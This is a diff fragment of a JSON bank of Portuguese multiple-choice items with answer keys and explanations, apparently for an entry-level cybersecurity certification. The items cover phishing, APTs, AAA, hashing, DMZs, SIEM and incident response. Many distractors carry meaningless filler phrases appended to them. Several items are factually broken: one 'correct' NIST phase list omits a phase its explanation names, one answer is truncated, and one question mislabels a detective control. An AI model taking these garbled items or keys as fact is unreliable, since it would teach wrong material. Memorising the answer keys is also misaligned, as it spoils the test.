+          "Tailgating (seguir atrás)",
+          "Smishing em parques de vários fabricantes",
+          "Injeção de SQL",
+          "Envenenamento de DNS"
+        ],
+        "correct": 0,
+        "explanation": "O tailgating (ou piggybacking) é um ataque físico de engenharia social em que o atacante entra atrás de uma pessoa autorizada por uma porta segura.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Um SMS diz que o seu cartão bancário está bloqueado e pede para tocar num link para o desbloquear. Como se chama esta técnica?",
+        "options": [
+          "Vishing",
+          "Smishing",
+          "Whaling",
+          "Watering hole"
+        ],
+        "correct": 1,
+        "explanation": "O smishing é phishing feito por mensagens SMS; o vishing usa chamadas de voz e o whaling tem como alvo executivos.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "O que descreve melhor uma Ameaça Persistente Avançada (APT)?",
+        "options": [
+          "Uma análise automática pontual de hosts aleatórios da Internet",
+          "Um atacante furtivo e com muitos recursos que mantém acesso prolongado a um alvo",
+          "Uma má configuração inofensiva encontrada numa auditoria na maioria dos ambientes de produção",
+          "Um vírus antigo que só se espalha por disquetes no dia a dia das operações"
+        ],
+        "correct": 1,
+        "explanation": "Uma APT é um adversário capaz e bem financiado (muitas vezes ligado a um Estado) que obtém e mantém acesso encoberto e prolongado a um alvo específico.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "O que é uma botnet?",
+        "options": [
+          "Uma rede de backup mantida offline para recuperação",
+          "Uma rede de dispositivos comprometidos controlados remotamente por um atacante",
+          "Um cluster de firewalls que equilibra o tráfego na maioria dos ambientes de produção",
+          "Um protocolo para cifrar o correio em trânsito sem ferramentas adicionais"
+        ],
+        "correct": 1,
+        "explanation": "Uma botnet é um conjunto de máquinas infetadas (bots) controladas por um atacante, usadas tipicamente para DDoS, spam ou credential stuffing.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "No AAA, que parte decide O QUE um utilizador autenticado pode fazer?",
+        "options": [
+          "Autenticação",
+          "Autorização",
+          "Contabilização",
+          "Associação"
+        ],
+        "correct": 1,
+        "explanation": "A Autenticação prova quem é, a Autorização decide o que pode fazer e a Contabilização regista o que foi feito.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Porque é que o RADIUS é muito usado no controlo de acesso à rede?",
+        "options": [
+          "Centraliza a autenticação para que os equipamentos não guardem contas locais",
+          "Cifra todos os volumes de disco nos endpoints",
+          "Dispensa a necessidade de regras de firewall na maioria dos ambientes de produção",
+          "É um protocolo de encaminhamento para escolher o melhor caminho"
+        ],
+        "correct": 0,
+        "explanation": "O RADIUS centraliza o AAA para que switches, Wi-Fi e VPNs validem os utilizadores contra um servidor único em vez de contas locais em cada equipamento.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Qual é o melhor exemplo de autenticação multifator (MFA)?",
+        "options": [
+          "Uma password longa mudada todos os meses segundo a prática comum",
+          "Uma password mais um código de uma app de autenticação",
+          "Duas passwords diferentes para a mesma conta",
+          "Um nome de utilizador difícil de adivinhar"
+        ],
+        "correct": 1,
+        "explanation": "O MFA combina fatores de tipos diferentes; uma password (algo que se sabe) mais um código de app (algo que se tem) conta, duas passwords não.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Que propriedade oferece uma função de hash criptográfica?",
+        "options": [
+          "Pode ser revertida para recuperar a entrada original em redes empresariais típicas",
+          "Mapeia os dados para um valor de tamanho fixo difícil de reverter",
+          "Cifra sempre os dados com uma chave secreta partilhada",
+          "Comprime ficheiros para poupar espaço de armazenamento"
+        ],
+        "correct": 1,
+        "explanation": "Um hash é uma função de sentido único que produz um resumo de tamanho fixo; não é reversível nem é cifra.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Que associação entre estado dos dados e proteção está correta?",
+        "options": [
+          "Dados em trânsito protegidos por TLS",
+          "Dados em repouso protegidos ao desativar os registos",
+          "Dados em uso protegidos ao apagar as cópias de segurança",
+          "Dados em trânsito protegidos por espelhamento RAID"
+        ],
+        "correct": 0,
+        "explanation": "Os dados em trânsito são protegidos por cifra de transporte como o TLS; os dados em repouso por cifra de armazenamento; RAID e registos não são controlos de confidencialidade.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "O que é que um certificado digital liga principalmente?",
+        "options": [
+          "Uma chave pública à identidade do seu dono",
+          "Duas chaves simétricas para cifrar mais depressa",
+          "Uma password a um código de uso único",
+          "Um endereço MAC a um endereço IP"
+        ],
+        "correct": 0,
+        "explanation": "Um certificado X.509 liga uma chave pública a uma identidade, atestada por uma Autoridade de Certificação, o que é a base da confiança na PKI.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Que protocolo TCP/IP não tem autenticação, tornando possível o ARP spoofing numa LAN?",
+        "options": [
+          "ARP",
+          "HTTPS",
+          "SSH",
+          "IPsec"
+        ],
+        "correct": 0,
+        "explanation": "O ARP não tem autenticação, por isso um atacante pode enviar respostas forjadas (ARP spoofing) para redirecionar o tráfego da LAN; HTTPS, SSH e IPsec autenticam.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.1"
+      },
+      {
+        "question": "Como é que a segmentação de rede melhora a segurança?",
+        "options": [
+          "Cifra automaticamente todos os pacotes",
+          "Limita até onde um atacante se pode mover entre zonas",
+          "Elimina a necessidade de passwords dentro de cada zona",
+          "Garante 100% de disponibilidade para todos os servidores"
+        ],
+        "correct": 1,
+        "explanation": "A segmentação (VLANs, sub-redes, firewalls entre zonas) contém intrusões e limita o movimento lateral, mas não cifra o tráfego nem dispensa a autenticação.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "Qual é o papel de uma DMZ numa rede?",
+        "options": [
+          "Uma zona que aloja serviços expostos à Internet isolados da LAN interna",
+          "Um túnel cifrado entre dois escritórios na maioria dos ambientes de produção",
+          "Uma fonte de alimentação de reserva para os equipamentos de rede",
+          "Uma lista de endereços IP bloqueados em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "Uma DMZ é um segmento que expõe serviços públicos (web, correio) mantendo-os isolados da rede interna de confiança.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Para que serve um honeypot?",
+        "options": [
+          "Para acelerar o tráfego legítimo",
+          "Para atrair e observar atacantes num sistema-engodo",
+          "Para guardar cópias de segurança cifradas fora do local",
+          "Para equilibrar a carga entre servidores web"
+        ],
+        "correct": 1,
+        "explanation": "Um honeypot é um sistema-engodo concebido para atrair atacantes, de modo a detetar e estudar o seu comportamento sem arriscar a produção.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Que definição protege melhor um Wi-Fi de pequeno escritório?",
+        "options": [
+          "Esconder apenas o SSID",
+          "WPA3 (ou WPA2) com uma frase-passe forte",
+          "Manter a password de administração por omissão",
+          "Filtragem de MAC como único controlo"
+        ],
+        "correct": 1,
+        "explanation": "A cifra forte WPA3/WPA2 com uma boa frase-passe é o controlo principal; esconder o SSID ou filtrar MAC sozinhos são fracos e facilmente contornáveis.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.4"
+      },
+      {
+        "question": "Um trabalhador remoto precisa de acesso cifrado a servidores internos pela Internet. Que tecnologia se adequa?",
+        "options": [
+          "Uma VPN",
+          "Um servidor DHCP",
+          "Um pool de NAT",
+          "Um servidor NTP"
+        ],
+        "correct": 0,
+        "explanation": "Uma VPN cria um túnel cifrado para que um utilizador remoto alcance recursos internos de forma segura através da Internet pública.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
+      },
+      {
+        "question": "O que é que o NAC (Controlo de Acesso à Rede) verifica sobretudo antes de permitir um dispositivo na rede?",
+        "options": [
+          "A identidade e a postura de segurança do dispositivo",
+          "O modelo exato do monitor do utilizador",
+          "O número de separadores abertos no browser",
+          "O brilho do ecrã quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O NAC verifica quem/o que se está a ligar e se o dispositivo cumpre os requisitos de postura (atualizações, antivírus) antes de conceder acesso.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
+      },
+      {
+        "question": "No Windows, o que faz uma firewall de host como a Firewall do Windows Defender?",
+        "options": [
+          "Controla as ligações de rede de e para esse único computador",
+          "Cifra o disco rígido do computador no dia a dia das operações",
+          "Analisa os anexos de correio no servidor de email",
+          "Gere as políticas de grupo do Active Directory"
+        ],
+        "correct": 0,
+        "explanation": "Uma firewall de host filtra o tráfego de entrada/saída da máquina individual onde corre, complementando as firewalls de rede.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "O que é a escalada de privilégios num endpoint?",
+        "options": [
+          "Dar a todas as apps os mesmos direitos baixos durante janelas de manutenção de rotina",
+          "Obter direitos superiores aos concedidos, por exemplo de utilizador a administrador",
+          "Mudar o nome da conta de administrador quando não existem outros controlos",
+          "Terminar a sessão de utilizadores inativos automaticamente"
+        ],
+        "correct": 1,
+        "explanation": "A escalada de privilégios é quando um atacante ou processo obtém permissões superiores às devidas, por exemplo passar de utilizador normal a SYSTEM/administrador.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "Que ferramenta de linha de comandos mostra as ligações de rede ativas e as portas à escuta num host?",
+        "options": [
+          "netstat",
+          "ipconfig",
+          "chmod",
+          "traceroute"
+        ],
+        "correct": 0,
+        "explanation": "O netstat lista ligações ativas e portas à escuta, útil para detetar serviços suspeitos; o ipconfig mostra definições de IP e o traceroute traça caminhos.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.2"
+      },
+      {
+        "question": "Que ferramenta captura e inspeciona pacotes em bruto numa interface para análise?",
+        "options": [
+          "tcpdump",
+          "nslookup",
+          "whoami",
+          "ping"
+        ],
+        "correct": 0,
+        "explanation": "O tcpdump captura pacotes em bruto para análise; o nslookup consulta DNS, o whoami mostra o utilizador atual e o ping testa a acessibilidade.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.2"
+      },
+      {
+        "question": "Que referencial de conformidade rege especificamente a proteção de dados de cartões de pagamento?",
+        "options": [
+          "PCI DSS",
+          "HIPAA",
+          "RGPD na maioria dos ambientes de produção",
+          "FERPA"
+        ],
+        "correct": 0,
+        "explanation": "O PCI DSS cobre os dados de titulares de cartões; o HIPAA cobre dados de saúde nos EUA, o RGPD dados pessoais na UE e o FERPA registos educativos nos EUA.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
+      },
+      {
+        "question": "Qual é a principal preocupação de segurança numa política de BYOD (traz o teu próprio dispositivo)?",
+        "options": [
+          "Os dispositivos usam pouca eletricidade quando não existem outros controlos na maioria dos ambientes de produção",
+          "Os dispositivos pessoais podem não ser geridos e misturam dados pessoais e corporativos",
+          "Os colaboradores nunca instalarão aplicações durante janelas de manutenção de rotina",
+          "O Wi-Fi do escritório fica mais rápido durante janelas de manutenção de rotina"
+        ],
+        "correct": 1,
+        "explanation": "O BYOD significa que dispositivos pessoais, muitas vezes não geridos, acedem a dados corporativos, pelo que são precisos controlos como MDM, cifra e contentorização.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
+      },
+      {
+        "question": "Porque é importante aplicar atualizações atempadamente para a segurança?",
+        "options": [
+          "Torna o ecrã mais brilhante no dia a dia das operações",
+          "Fecha vulnerabilidades conhecidas antes de serem exploradas",
+          "Aumenta o tamanho do disco segundo a prática comum durante janelas de manutenção de rotina",
+          "Desativa todos os registos em redes empresariais típicas"
+        ],
+        "correct": 1,
+        "explanation": "As atualizações corrigem falhas conhecidas; muitas intrusões exploram vulnerabilidades para as quais já existe correção que não foi aplicada.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.4"
+      },
+      {
+        "question": "No Windows, que ferramenta se abre primeiro para rever os registos de sistema e de segurança?",
+        "options": [
+          "Visualizador de Eventos",
+          "Gestor de Tarefas",
+          "Limpeza do Disco",
+          "Bloco de Notas na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "O Visualizador de Eventos mostra os registos de sistema, aplicação e segurança do Windows, o ponto de partida para detetar anomalias num host.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "No Linux, onde são tradicionalmente recolhidas muitas mensagens de autenticação e de sistema?",
+        "options": [
+          "Na facilidade syslog (por exemplo /var/log)",
+          "No firmware da BIOS quando não existem outros controlos",
+          "Na partição de swap",
+          "Na memória da GPU segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "O Linux recolhe mensagens de autenticação e de sistema via syslog, tipicamente em /var/log (auth.log, messages, journal), usadas na deteção de anomalias.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "Qual é a diferença entre reconhecimento ativo e passivo?",
+        "options": [
+          "O ativo interage com o alvo; o passivo só observa dados disponíveis",
+          "O ativo é sempre legal; o passivo é sempre ilegal",
+          "O ativo usa IPv6; o passivo usa IPv4 na maioria dos ambientes de produção",
+          "Não há diferença entre eles em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O reconhecimento ativo envia sondas ao alvo (varrimentos de portas), sendo detetável; o passivo recolhe informação pública sem tocar no alvo.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.1"
+      },
+      {
+        "question": "O que representa um identificador CVE?",
+        "options": [
+          "Uma referência única para uma vulnerabilidade publicamente conhecida",
+          "Uma norma de cifra de VPN da Cisco no dia a dia das operações",
+          "Um formato de exportação de cofre de credenciais",
+          "Uma extensão de validade de certificado quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Um ID CVE (Common Vulnerabilities and Exposures) referencia de forma única uma vulnerabilidade divulgada publicamente, para que ferramentas e avisos a identifiquem igual.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.2"
+      },
+      {
+        "question": "Como diferem vulnerabilidade e risco?",
+        "options": [
+          "São exatamente a mesma coisa segundo a prática comum",
+          "Uma vulnerabilidade é uma fraqueza",
+          "O risco só se aplica a hardware",
+          "Uma vulnerabilidade causa sempre uma falha de segurança"
+        ],
+        "correct": 1,
+        "explanation": "Uma vulnerabilidade é uma fraqueza; o risco combina a probabilidade de uma ameaça a explorar com o impacto resultante, por isso nem toda a vulnerabilidade é de risco elevado.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.3"
+      },
+      {
+        "question": "Na recuperação de desastres, o que define o RPO (Objetivo de Ponto de Recuperação)?",
+        "options": [
+          "Quanta perda de dados, medida em tempo, é aceitável",
+          "Quão depressa se acendem as luzes do escritório",
+          "Quantos utilizadores podem iniciar sessão ao mesmo tempo",
+          "O comprimento máximo da password"
+        ],
+        "correct": 0,
+        "explanation": "O RPO é a quantidade máxima aceitável de perda de dados expressa como janela de tempo, o que determina a frequência das cópias de segurança.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
+      },
+      {
+        "question": "Um controlo de recuperação que deteta um incidente em curso (por exemplo um alerta de IDS) é de que tipo?",
+        "options": [
+          "Preventivo",
+          "Detetivo",
+          "Corretivo",
+          "Cosmético"
+        ],
+        "correct": 1,
+        "explanation": "Os controlos são preventivos (impedem), detetivos (percebem) ou corretivos (reparam); um alerta de IDS que perceciona um evento é detetivo.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
+      },
+      {
+        "question": "O que faz sobretudo um SIEM num centro de operações de segurança?",
+        "options": [
+          "Recolhe e correlaciona registos de muitas fontes para gerar alertas",
+          "Tranca fisicamente a porta da sala de servidores",
+          "Cifra todos os portáteis dos utilizadores em parques de vários fabricantes",
+          "Encaminha pacotes entre VLANs quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Um SIEM agrega e correlaciona registos/eventos de todo o parque para que os analistas detetem e investiguem incidentes.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "Como é que o SOAR acrescenta valor em cima de um SIEM?",
+        "options": [
+          "Automatiza e orquestra ações de resposta para os alertas",
+          "Elimina a necessidade de recolher registos",
+          "É apenas um motor antivírus mais rápido quando não existem outros controlos",
+          "Cifra só a base de dados do SIEM em repouso"
+        ],
+        "correct": 0,
+        "explanation": "O SOAR acrescenta playbooks automáticos e orquestração para que passos repetitivos de resposta corram sozinhos, reduzindo a carga dos analistas.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "O que descreve o modelo Cyber Kill Chain?",
+        "options": [
+          "As fases ordenadas por que passa um atacante",
+          "Uma lista de cifras aprovadas durante janelas de manutenção de rotina",
+          "A ordem dos fios de um cabo Ethernet",
+          "Um calendário de rotação de backups"
+        ],
+        "correct": 0,
+        "explanation": "A Cyber Kill Chain divide uma intrusão em fases ordenadas (reconhecimento, armamento, entrega, exploração, instalação, C2, ações), ajudando os defensores a interrompê-la.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "De que é que a matriz MITRE ATT&CK é sobretudo um catálogo?",
+        "options": [
+          "Táticas e técnicas de adversários observadas no mundo real",
+          "Fabricantes de firewalls aprovados segundo a prática comum",
+          "Gamas de atribuição de endereços IP",
+          "Normas de cores de cabos quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O ATT&CK cataloga táticas (objetivos) e técnicas (como) de adversários reais, usado para mapear deteções e avaliar cobertura.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Na resposta a incidentes, o que é a 'cadeia de custódia'?",
+        "options": [
+          "A ordem em que os switches encaminham tramas",
+          "Um registo documentado de quem manuseou as provas e quando",
+          "A sequência das regras de firewall quando não existem outros controlos",
+          "A lista de utilizadores de um grupo"
+        ],
+        "correct": 1,
+        "explanation": "A cadeia de custódia é o rasto documentado que mostra como as provas foram recolhidas, manuseadas e guardadas, para se manterem admissíveis e credíveis.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "No RGPD, qual é uma obrigação-chave após uma violação qualificável de dados pessoais?",
+        "options": [
+          "Notificar a autoridade de controlo dentro do prazo exigido",
+          "Apagar imediatamente todas as cópias de segurança da empresa",
+          "Publicar publicamente todas as passwords afetadas",
+          "Desligar toda a rede durante uma semana"
+        ],
+        "correct": 0,
+        "explanation": "O RGPD exige notificar a autoridade de controlo (em regra em 72 horas) e, quando há risco elevado, informar os titulares afetados.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "5.3"
+      },
+      {
+        "question": "Que sequência corresponde ao ciclo de resposta a incidentes do NIST SP 800-61?",
+        "options": [
+          "Preparação; Deteção e Análise; Contenção",
+          "Backup; Restauro; Reinício; Relatório",
+          "Varrer; Corrigir; Varrer; Corrigir",
+          "Entrar; Sair; Auditar; Apagar quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "O NIST SP 800-61 define quatro fases: Preparação; Deteção e Análise; Contenção, Erradicação e Recuperação; e Atividade Pós-Incidente (lições aprendidas).",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.4"
+      },
+      {
+        "question": "O que distingue o ransomware de outro malware?",
+        "options": [
+          "Acelera o computador silenciosamente na maioria dos ambientes de produção",
+          "Cifra ou bloqueia os dados e exige pagamento para restaurar o acesso",
+          "Mostra apenas anúncios inofensivos sem ferramentas adicionais",
+          "Melhora a autonomia da bateria nos portáteis"
+        ],
+        "correct": 1,
+        "explanation": "O ransomware cifra ou bloqueia os dados da vítima e exige um resgate pela chave de decifra ou pela reposição do acesso.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "O que é uma ameaça interna (insider)?",
+        "options": [
+          "Um risco vindo de alguém com acesso legítimo, como um colaborador",
+          "Um scanner externo a sondar a firewall sem ferramentas adicionais",
+          "Uma falha de energia no centro de dados quando não existem outros controlos",
+          "Um erro de software no firmware do router"
+        ],
+        "correct": 0,
+        "explanation": "Uma ameaça interna vem de pessoas com acesso autorizado (colaboradores, prestadores) que o usam indevidamente, por malícia ou negligência.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "O que é um ataque man-in-the-middle (MitM)?",
+        "options": [
+          "Um atacante retransmite em segredo e pode alterar o tráfego entre duas partes",
+          "Uma cópia de segurança agendada que corre à meia-noite quando não existem outros controlos",
+          "Uma regra de firewall que descarta todo o tráfego sem ferramentas adicionais",
+          "Um tipo de conjunto de discos RAID na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "Num ataque MitM o adversário coloca-se entre duas partes em comunicação para intercetar e, possivelmente, modificar o seu tráfego.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Qual é uma fraqueza comum de segurança em dispositivos IoT?",
+        "options": [
+          "Ter demasiada RAM no dia a dia das operações",
+          "Virem com credenciais por omissão ou embutidas",
+          "Correrem demasiadas atualizações de segurança",
+          "Usarem firmware cifrado por omissão sem ferramentas adicionais"
+        ],
+        "correct": 1,
+        "explanation": "Muitos dispositivos IoT vêm com passwords por omissão/embutidas e raramente são atualizados, tornando-se alvos fáceis e recrutas de botnets.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "O que é um 'vetor de ataque'?",
+        "options": [
+          "O caminho ou método que o atacante usa para alcançar e comprometer um alvo",
+          "Um gráfico da temperatura do CPU na maioria dos ambientes de produção",
+          "O comprimento físico de um cabo de rede em parques de vários fabricantes",
+          "Uma folha de cálculo com salários sem ferramentas adicionais em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "Um vetor de ataque é a via/técnica (email de phishing, porta exposta, USB) por onde um atacante obtém acesso a um sistema.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "Porque é que o MD5 é considerado inadequado para hashing sensível à segurança hoje?",
+        "options": [
+          "É demasiado lento para CPUs modernos",
+          "É vulnerável a ataques práticos de colisão",
+          "Produz saída de comprimento variável",
+          "Exige uma chave secreta partilhada no dia a dia das operações"
+        ],
+        "correct": 1,
+        "explanation": "O MD5 tem ataques práticos de colisão, pelo que duas entradas diferentes podem partilhar o mesmo hash; recomendam-se algoritmos mais fortes como o SHA-256.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "O que procura fazer um ataque de negação de serviço (DoS)?",
+        "options": [
+          "Roubar hashes de passwords silenciosamente",
+          "Tornar um serviço indisponível para utilizadores legítimos",
+          "Cifrar ficheiros para pedir resgate na maioria dos ambientes de produção",
+          "Escalar privilégios até administrador"
+        ],
+        "correct": 1,
+        "explanation": "Um ataque DoS sobrecarrega ou derruba um serviço para que utilizadores legítimos não o possam usar; o DDoS faz isso a partir de muitas fontes ao mesmo tempo.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Qual é o objetivo de uma boa política de passwords?",
+        "options": [
+          "Obrigar os utilizadores a partilhar passwords",
+          "Reduzir a hipótese de credenciais adivinháveis ou reutilizadas",
+          "Guardar passwords em texto simples",
+          "Desativar os bloqueios de conta durante janelas de manutenção de rotina"
+        ],
+        "correct": 1,
+        "explanation": "Uma boa política de passwords (comprimento, complexidade, não reutilização, bloqueio) reduz o risco de credenciais fracas ou adivinháveis serem quebradas.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Como é que o NAT afeta ligações diretas de entrada da Internet para um host interno?",
+        "options": [
+          "Torna os hosts internos diretamente acessíveis por IP público",
+          "Esconde os hosts internos atrás de um endereço público",
+          "Cifra todo o tráfego interno segundo a prática comum",
+          "Atribui endereços IPv6 a cada host"
+        ],
+        "correct": 1,
+        "explanation": "O NAT mapeia endereços privados para um público; entradas não solicitadas não têm mapeamento, por isso os hosts internos não são diretamente acessíveis por omissão.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "Qual é o primeiro passo seguro quando um host mostra sinais de infeção por malware?",
+        "options": [
+          "Continuar a usá-lo normalmente na maioria dos ambientes de produção",
+          "Isolá-lo da rede e correr uma análise de confiança",
+          "Partilhar os seus ficheiros com colegas",
+          "Desativar todos os seus registos"
+        ],
+        "correct": 1,
+        "explanation": "Isolar o host trava a propagação e o C2; depois pode fazer-se uma análise de confiança e a investigação antes da limpeza ou reinstalação.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.6"
+      },
+      {
+        "question": "O que consegue um varrimento de portas para um atacante ou auditor?",
+        "options": [
+          "Corrige serviços vulneráveis durante janelas de manutenção de rotina",
+          "Descobre que portas TCP/UDP e serviços estão abertos num host",
+          "Cifra o disco do alvo no dia a dia das operações",
+          "Repõe as passwords dos utilizadores"
+        ],
+        "correct": 1,
+        "explanation": "Um varrimento de portas enumera portas abertas e serviços à escuta, revelando a superfície de ataque; é reconhecimento, não uma correção.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.1"
+      },
+      {
+        "question": "Ao monitorizar eventos de segurança, o que deve despoletar escalonamento?",
+        "options": [
+          "Cada início de sessão normal bem-sucedido durante janelas de manutenção de rotina",
+          "Um sinal credível de incidente de segurança além do ruído de rotina",
+          "Uma cópia de segurança noturna agendada a terminar",
+          "Um utilizador a mudar o fundo do ambiente de trabalho"
+        ],
+        "correct": 1,
+        "explanation": "Os analistas escalam quando há indícios de um incidente real (por exemplo malware confirmado, exfiltração de dados), não por eventos benignos de rotina.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "O que descreve melhor a cifra assimétrica?",
+        "options": [
+          "Uma chave secreta partilhada cifra e decifra",
+          "Uma chave pública cifra e a chave privada correspondente decifra",
+          "Nunca usa chaves em parques de vários fabricantes",
+          "Só funciona com dados em repouso quando não existem outros controlos"
+        ],
+        "correct": 1,
+        "explanation": "A cifra assimétrica (de chave pública) usa um par de chaves: a pública cifra (ou verifica) e a privada decifra (ou assina).",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Porque é que o DHCP é uma preocupação de segurança numa LAN não fiável?",
+        "options": [
+          "Cifra o tráfego de forma demasiado forte",
+          "Um servidor DHCP rogue pode entregar um gateway ou DNS malicioso",
+          "Usa apenas a porta TCP 443 durante janelas de manutenção de rotina",
+          "Desativa completamente o ARP em redes empresariais típicas"
+        ],
+        "correct": 1,
+        "explanation": "Um servidor DHCP rogue pode atribuir aos clientes um gateway/DNS malicioso, permitindo interceção; o DHCP snooping mitiga isto.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.1"
+      },
+      {
+        "question": "Que exemplo se enquadra melhor em 'algo que se é' como fator de autenticação?",
+        "options": [
+          "Um código PIN",
+          "Uma impressão digital",
+          "Um token de hardware",
+          "Uma pergunta de segurança"
+        ],
+        "correct": 1,
+        "explanation": "Os fatores de autenticação são algo que se sabe (PIN), se tem (token) ou se é (biometria); uma impressão digital é 'algo que se é'.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
